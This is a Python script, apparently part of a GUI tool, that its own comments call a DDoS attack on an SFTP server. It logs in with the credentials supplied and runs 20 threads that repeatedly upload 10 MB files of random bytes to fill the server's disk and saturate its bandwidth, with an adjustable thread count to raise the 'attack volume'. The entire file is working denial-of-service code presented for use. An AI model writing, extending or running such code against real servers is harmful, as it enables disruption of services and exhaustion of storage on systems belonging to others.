import paramiko  # Import paramiko for SFTP connections
import time  # Import time for sleep functionality
import tkinter as tk  # Import tkinter to use its components
from concurrent.futures import ThreadPoolExecutor  # Import ThreadPoolExecutor for concurrent uploads
import os  # Import os for file operations
import random  # Import random for generating random files
import string  # Import string for generating random filenames
import threading  # Import threading for event handling

# Define the number of threads for the DDoS attack
NUM_THREADS = 20  # Adjust this value to increase or decrease the attack volume

# Function to generate a random file with the specified size
def generate_random_file(size):
    """Generate a random file with the specified size."""
    filename = ''.join(random.choices(string.ascii_letters + string.digits, k=10))  # Generate a random filename
    with open(filename, 'wb') as file:  # Open the file in binary write mode
        file.write(os.urandom(size))  # Write random bytes to the file
    return filename  # Return the generated filename

def attempt_upload_file(host, port, user, password, output_text, stop_event):
    """Attempt to upload a random file to the specified SFTP server."""
    try:
        # Create a new SSH client
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # Automatically add the server's host key
        client.connect(host, port=port, username=user, password=password)  # Connect to the SFTP server

        # Create an SFTP client
        sftp = client.open_sftp()

        while not stop_event.is_set():  # Check for stop signal
            # New functionality: Upload a random file after successful connection
            file_size = 1024 * 1024 * 10  # Define the size of the random file (10 MB)
            filename = generate_random_file(file_size)  # Generate a random file

            if stop_event.is_set():  # Check again before uploading
                os.remove(filename)  # Cleanup the generated file
                output_text.insert(tk.END, "[DDoS] Attack stopped. Cleaning up...\n")  # Status message
                break  # Exit the loop if stop event is set

            sftp.put(filename, filename)  # Upload the file to the server
            os.remove(filename)  # Remove the file from the local system after upload

            time.sleep(0.1)  # Adjust the delay as needed to control the upload rate

    except Exception as e:
        output_text.insert(tk.END, f"[DDoS] Error: {str(e)}\n")  # Handle errors and display them
    finally:
        sftp.close()  # Close the SFTP client
        client.close()  # Close the SSH client

def perform_ddos(host, port, user, password, output_text, stop_event):
    """Perform the DDoS attack by uploading files to the SFTP server."""
    output_text.delete(1.0, tk.END)  # Clear previous output in the GUI
    output_text.insert(tk.END, "[DDoS] Starting attack...\n")  # Indicate that the attack is starting

    with ThreadPoolExecutor(max_workers=NUM_THREADS) as executor:  # Create a thread pool for concurrent uploads
        while not stop_event.is_set():  # Check for stop signal
            # Submit multiple upload attempts
            for _ in range(NUM_THREADS):
                if stop_event.is_set():  # Check for stop signal before submitting
                    break
                executor.submit(attempt_upload_file, host, port, user, password, output_text, stop_event)  # Submit upload task
            time.sleep(0.1)  # Small delay to prevent tight loop

    output_text.insert(tk.END, "[DDoS] Attack stopped.\n")  # Indicate that the attack is complete or stopped

# Function to reset the stop event and prepare for a new attack
def start_attack(host, port, user, password, output_text, stop_event):
    """Start the DDoS attack by resetting the stop event and calling perform_ddos."""
    stop_event.clear()  # Reset the stop event
    perform_ddos(host, port, user, password, output_text, stop_event)  # Start the attack